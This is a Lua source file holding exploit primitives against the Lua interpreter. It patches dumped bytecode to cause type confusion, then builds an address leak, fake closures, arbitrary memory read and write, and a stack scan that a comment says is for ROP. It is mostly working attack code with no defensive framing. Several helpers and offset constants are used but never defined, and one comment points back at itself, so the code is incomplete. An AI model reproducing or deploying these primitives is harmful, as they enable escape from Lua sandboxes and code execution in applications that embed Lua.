-- 64-bit number to str
local function ub8(n)
    return string.pack('<I8', n)
end

-- 32-bit number to str
local function ub4(n)
    return string.pack('<I4', n)
end

-- 8-byte string to 64-bit integer
local function deub8(val)
    return string.unpack('<I8', val)
end

-- 4-byte string to 32-bit integer
local function deub4(val)
    return string.unpack('<I4', val)
end

-- wrapper for load that causes an error if loading fails
local function _load(s)
    local ret, err = load(s)
    if ret == nil then error(err) end
    return ret
end

-- induce type confusion: skip type checks in FORPREP and treat non-numeric
-- TValue as a lua_Number TValue, which can be used to leak the address
-- of GC-able objects
local _asnum = _load(string.dump(function(n)
    for i = 0, 1e666, n do
        return i
    end
end):gsub(
    ub4(0x000080ca), -- "FORPREP",  1, 1
    ub4(0x80000038)  -- "JMP",      1, 0
))

-- , then decode lua_Number containing leaked pointer into an usable integer value
local function addrOf(obj)
    -- leak address of obj via _asnum (as float)
    local addr_num = _asnum(obj)
    -- dump float to byte string and parse it to the leaked address
    local addr_bytes = string.pack('<d', addr_num)
    local decoded_addr = deubPTRSIZE(addr_bytes)
    return decoded_addr
end

local function PrintHex(data)
    local t = {}
    for i = 1, #data do
        t[i] = string.format("%02x", data:sub(i, i):byte())
    end
    print(table.concat(t))
end

local function pad(n)
    return string.rep("A", n)
end

-- takes in a byte string and returns the address of the actual string;
-- useful for having a pointer to arbitrary data
local function dataPtr(data)
    return addrOf(data) + TSTRING_CONTENTS_OFF
end

-- helper function to create a custom LClosure with an associated custom Proto;
-- first argument in the data for the first constant value (cl->p->k);
-- optional second argument is for the address the first upvalue should point to (cl->upvals[0])
-- returns the address of the created closure
local function fakeClosure(kconst, upval_addr)
    local tvalue = dataPtr(kconst)
    local proto_data = pad(PROTO_K_OFF) .. ubPTRSIZE(tvalue)
    local proto = dataPtr(proto_data)
    local closure = pad(LCLOSURE_P_OFF) .. ubPTRSIZE(proto)

    if upval_addr ~= nil then
        local upval_data = pad(UPVAL_VALUE_OFF) .. ubPTRSIZE(upval_addr)
        local upval = dataPtr(upval_data)
        closure = closure .. ubPTRSIZE(upval)
    end

    return dataPtr(closure)
end

-- function with two nested function calls, where the associated LClosure pointer
-- of the middle function is overwritten, allowing for the constant values (empty string here)
-- of the closure to be modified to arbitrary addresses, for object crafting;
-- argument is address to custom LClosure
local _stompClosure = _load(string.dump(function(closure)
    local target
    local ret = (function()
        (function()
            -- overwrite parent closure
            target = closure
        end)()
        -- return modified const value from closure
        return ''
    end)()
    -- pass on to caller
    return ret
end
-- point target upvalue to enclosing closure, allowing for it to be overwritten
):gsub("\x01\x01\x00(\x01\x00\x00)", "\x01\x02\x00%1"))

-- use above function to craft arbitrary object in memory;
-- takes raw bytes of the to-be-crafted object as argument;
-- returns a usable Lua value corresponding to the crafted object
local function craftObject(obj)
    return _stompClosure(fakeClosure(obj))
end

-- read arbitrary memory addresses and returns a byte string with the data;
-- works by crafting LUA_VLNGSTR string objects, making it point to the to-be-read data,
-- and getting the length of it, which is read from the lnglen field,
-- revealing sizeof(size_t) bytes at a time
-- takes address of memory to read, and size (in bytes) of data to read
local function read(addr, size)
    local prefix = addr % PTRSIZE
    addr = addr - prefix
    size = size + prefix
    local t = {}

    for i = 1, (size + PTRMIN1) // PTRSIZE do
        local data = ub8(addr - STRING_LEN_OFF + i * PTRSIZE) .. '\x14'
        t[i] = ubPTRSIZE(#craftObject(data))
    end

    local ret = table.concat(t)
    if prefix > 0 then
        ret = ret:sub(prefix + 1)
        size = size - prefix
    end

    ret = ret:sub(1, size)

    return ret
end

-- similar to _writeToUpVal, but writes the value of the first constant to
-- the address stored in the UpVals; for arbitrary write primitive
local _writeToUpVal = _load(string.dump(function(closure)
    local target
    (function()
        (function()
            -- overwrite parent closure
            target = closure
        end)()
        -- write const val from created closure to upval pointing to closure's UpVal address
        target = ''
    end)()
end
-- point target upvalue to enclosing closure, allowing for it to be overwritten
):gsub("\x01\x01\x00(\x01\x00\x00)", "\x01\x02\x00%1"))

-- arbitrary write via _writeToUpVal;
-- first argument is address to write to;
-- second argument is byte string to write
local function write(addr, value)
    addr = addr - 1
    local remainder = #value % 8
    if remainder > 0 then
        -- zero-pad past end
        value = value .. string.rep('\x00', 8 - remainder)
    end

    for i = 1, #value, 8 do
        _writeToUpVal(fakeClosure(value:sub(i, i + 7) .. '\x03', addr + i))
    end
end

-- scan memory backwards, starting from first argument, until
-- a sizeof(size_t); used to scan stack for address in main after lua_pcallk for ROP
local function search_backwards(start, target)
    for addr = start, start - 0x2000, -PTRSIZE do
        if read(addr, PTRSIZE) == target then return addr end
    end
end
